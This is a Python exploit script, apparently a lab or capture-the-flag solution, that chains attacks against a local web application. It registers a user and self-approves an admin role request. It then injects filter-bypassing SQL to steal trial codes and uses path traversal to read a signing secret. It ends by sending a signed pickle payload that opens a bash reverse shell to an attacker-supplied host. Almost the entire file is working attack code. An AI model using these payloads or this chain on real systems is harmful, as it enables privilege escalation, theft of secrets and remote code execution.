import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import random
import re
import string
import subprocess
import sys
import time
import requests
import threading
import argparse
import hmac
import hashlib
import pickle
import os
from urllib.parse import urlparse, parse_qs


# @bp.route("/register", methods=["GET", "POST"])  注册用户  无需邮箱激活

# @bp.route("/login", methods=["GET", "POST"]) 

# 申请

# @bp.route("/api/v1/team/role-requests", methods=["POST"]) 提权漏洞 可改为 operator 或admin

# 批准

# @bp.route("/api/v1/team/role-requests/int:rid/approve", methods=["POST"])

# SQL注入漏洞

# @bp.route("/api/v1/analytics/monitors/search") 有过滤 

# @bp.route("/api/v1/billing/trials/redeem", methods=["POST"])  使用试用码 获得企业版订阅


# @bp.route("/api/v1/reports/public/download")  LFI 漏洞  泄露文件 signing_secret  

# hmac算法 report_token

# 登录接口，操作员，企业版

# @bp.route("/api/v1/reports/bundles/export", methods=["POST"])    命令注入  还需要报告tokens去找报告tokens，生成逻辑

requests.packages.urllib3.disable_warnings()

BASE_URL = "http://127.0.0.1:5000"
PROXY = "http://127.0.0.1:8080" 
MY_USER = f"liam_{random.randint(1000, 9999)}"
MY_PASS = "liam123"
USE_PROXY = False 
proxies = {
        "http": PROXY,
        "https": PROXY,  # 如果目标是 HTTPS 也加上
    } if USE_PROXY else None


def instance_key(iid, secret):
    return hmac.new(secret.encode(), str(iid).encode(), hashlib.sha256).digest()

def sign_blob(iid, secret,raw: bytes) -> str:
        key = instance_key(iid,secret)
        return hmac.new(key, raw, hashlib.sha256).hexdigest()


def get_session():
    """初始化会话并设置全局代理/配置"""
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
    session.verify = False  # 全局禁用 SSL 校验
    return session

def reg_and_log(session):
    try:
        regurl = f"{BASE_URL}/register"
        regdata = {
            "username":MY_USER,
            "password":MY_PASS
        }
        reg_res = session.post(
            regurl,
            data=regdata , 
            proxies=proxies, 
            timeout=5 ,
            verify=False , 
            allow_redirects=False
            )

        if reg_res.status_code != 302:
            print(f"[-] Registration failed for '{MY_USER}'. HTTP Status: {reg_res.status_code}")
            return False

        print(f"[+] User '{MY_USER}' registered successfully.")
        login_url = f"{BASE_URL}/login"
        login_data = {
            "username": MY_USER,
            "password": MY_PASS
        }
        
        login_res = session.post(
            login_url, 
            data=login_data, 
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )

        if login_res.status_code == 302 and "dashboard" in login_res.headers.get("Location", ""):
            print(f"[+] Logged in successfully as '{MY_USER}'")
            return True
        else:
            print(f"[-] Login failed for '{MY_USER}'. HTTP Status: {login_res.status_code}")
            return False


    except Exception as e:
        print(f"[-] Error in reg_and_log(): {e}")
        return False

def priv(session):
    try:
        # 1. 发送角色申请 (Send role request)
        role_url = f"{BASE_URL}/api/v1/team/role-requests"
        res1 = session.post(role_url, json={"requested_role": "admin"}, proxies=proxies, timeout=5 ,verify=False)
        
        # 提取 rid
        rid = res1.json().get("id")
        if not rid:
            print("[-] Failed to get request ID")
            return False
        print(f"[+] Got role request ID: {rid}")

        # 2. 发送越权/自我批准请求 (Self-approve request)
        approve_url = f"{BASE_URL}/api/v1/team/role-requests/{rid}/approve"
        res2 = session.post(approve_url, json={}, proxies=proxies, timeout=5 ,verify=False)


        if res2.status_code == 200 and res2.json().get("approved"):
            print("[+] Role request approved successfully!")
            return True
        else:
            print(f"[-] Approval failed: {res2.text}")
            return False

    except Exception as e:
        print(f"[-] Error in priv(): {e}")
        return False

def sqli(session):

    # sql = "SELECT id, name, status FROM monitors WHERE name LIKE '%" + sanitized_query + "%' ORDER BY name"
    # payload = SELECT id, name, status FROM monitors WHERE name LIKE 'x' UNI/**/ON SEL/**/ECT code, 'x', 'x' FROM trial_codes WHERE code LIKE '%%' ORDER BY name

    try:

        sql_url = f"{BASE_URL}/api/v1/analytics/monitors/search"
        sqli_payload = f"x' UNI/**/ON SEL/**/ECT code, 'x', 'x' FROM trial_codes WHERE code LIKE '%"
        params= {
            "q":sqli_payload
        }
        sqli_res = session.get(
            sql_url,
            params=params,
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )
        match = re.search(r'ENTERPRISE-TRIAL-[A-Z0-9]+', sqli_res.text)
        if not match:
            print(f"[-] SQLi regex: no 'ENTERPRISE-TRIAL-...' in response.")
            print(f"[*] Response snippet: {sqli_res.text[:200]}")
            return False
        trial_code = match.group(0)

    

    except Exception as e:

        print(f"[-] Error in sql(): {e}")
        return False

    return trial_code

def redeem(session):
    try:
        redeem_url = f"{BASE_URL}/api/v1/billing/trials/redeem"
        code = sqli(session)
        redeem_data = {
                "code":code
        }

        redeem_res = session.post(
            redeem_url,
            json = redeem_data,
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )

        if redeem_res.status_code == 200 and redeem_res.json().get("plan") == "enterprise":
            print(f"[+] Trial code '{code}' redeemed successfully!")
            print("[+] Plan upgraded to 'enterprise'!")
            return True
        else:
            print(f"[-] Redeem failed | HTTP {redeem_res.status_code}: {redeem_res.text}")
            return False

    except Exception as e:

        print(f"[-] Error in sql(): {e}")
        return False  

def lfi_secret(session):
    iid, secret = None, None
    try:
        lfi_url = f"{BASE_URL}/api/v1/reports/public/download"
        lfi_payload = "....//....//....//....//app/instance/app_settings.json"
        params= {
                    "name":lfi_payload
                }
        lfi_res = session.get(
                    lfi_url,
                    params=params,
                    proxies=proxies, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=False
                )
        m1 = re.search(r'inst_[a-zA-Z0-9]+', lfi_res.text)
        if not m1:
            print(f"[-] LFI regex: no 'inst_...' in response.")
            print(f"[*] Response snippet: {lfi_res.text[:200]}")
            return False
        iid = m1.group(0)
        m2 = re.search(r'sh_secret_[a-zA-Z0-9]+', lfi_res.text)
        if not m2:
            print(f"[-] LFI regex: no 'sh_secret_...' in response.")
            print(f"[*] Response snippet: {lfi_res.text[:200]}")
            return False
        secret = m2.group(0)


    except Exception as e:
      
        print(f"[-] Error in lfi(): {e}")
        return False  

    return iid , secret

class Rawblob:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
      
        return (os.system,(self.cmd,))
def raw_blob(lhost,lport):
    cmd = f"bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\""
    payload = pickle.dumps(Rawblob(cmd))
    raw = base64.b64encode(payload).decode()
    return raw

def blob_signature(session,lhost,lport):

    iid , secret = lfi_secret(session)
    
    encode_raw = raw_blob(lhost,lport)
    raw_bytes = base64.b64decode(encode_raw)
    signature = sign_blob(iid, secret,raw_bytes)

    return signature

def rce (session,lhost,lport):
    try:
        
        encode_raw = raw_blob(lhost,lport)
        signature = blob_signature(session,lhost,lport)
        if not encode_raw or not signature:
            print("[-] Failed to get encode_raw and signature")
            return False
        restore_url = f"{BASE_URL}/api/v1/administration/snapshots/restore"

        restore_data = {
            "snapshot": encode_raw,
            "signature": signature 
        }

        restore_res = session.post(
            restore_url,
            json = restore_data,
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )

        if restore_res.status_code == 200 and restore_res.json().get("restored") == True:
            print(f"[+] restore successfully!")
           
        else:
            print(f"[-] restore failed | HTTP {restore_res.status_code}: {restore_res.text}")
            return False

    except Exception as e:

        print(f"[-] Error in rce(): {e}")
        return False  


def man():

    parser = argparse.ArgumentParser(description="code injection")
    #parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://192.168.169.162)")
    parser.add_argument("-l", "--lhost", required=True, help="Local IP for listener (e.g., 192.168.119.169)")
    parser.add_argument("-p", "--lport", required=True, help="Local Port for listener (e.g., 8000)")
    # parser.add_argument("-s", "--shell_port", required=True, help="shell Port for listener (e.g., 4444)")
    args = parser.parse_args()


    lhost = args.lhost
    lport = int(args.lport)


    session  = get_session()
    if not reg_and_log(session):
        return
    if not priv(session):
        return

    rce(session, lhost, lport)

if __name__ == "__main__":
    man()